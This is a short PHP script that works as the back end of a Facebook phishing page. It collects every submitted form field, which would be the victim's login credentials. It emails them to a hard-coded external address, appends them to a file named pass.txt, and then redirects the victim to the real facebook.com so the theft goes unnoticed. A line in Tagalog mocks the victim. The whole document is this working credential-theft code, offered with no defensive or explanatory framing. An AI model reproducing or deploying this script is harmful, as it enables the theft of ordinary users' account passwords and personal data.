<?php
header ('Location: https://www.facebook.com');
$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}
$posts       .= "May Tangang Nag Login Wahaha\n";
$emailto    = 'jclaguerta23@usbc.be';
$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
$from        = "From:You";
$body        = '
'.$posts.'
';
@mail($emailto, $subject, $body, $from);
$handle = @fopen("pass.txt", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>